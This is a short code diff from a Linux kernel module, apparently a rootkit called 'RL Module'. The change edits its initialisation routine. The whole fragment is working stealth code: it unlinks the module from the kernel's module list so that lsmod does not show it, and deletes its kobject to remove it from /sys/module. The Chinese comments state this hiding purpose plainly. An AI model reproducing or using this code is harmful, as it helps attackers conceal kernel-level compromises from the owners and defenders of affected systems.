@@ -18,7 +18,7 @@ static int __init rl_init(void)
     printk("RL Module init!\n");
 
     //对lsmod命令隐藏模块名称
-    list_del_init(&__this_module.list);
+    list_del_init(&THIS_MODULE->list);
 
     //从/sys/module/目录下隐藏模块
     kobject_del(&THIS_MODULE->mkobj.kobj);
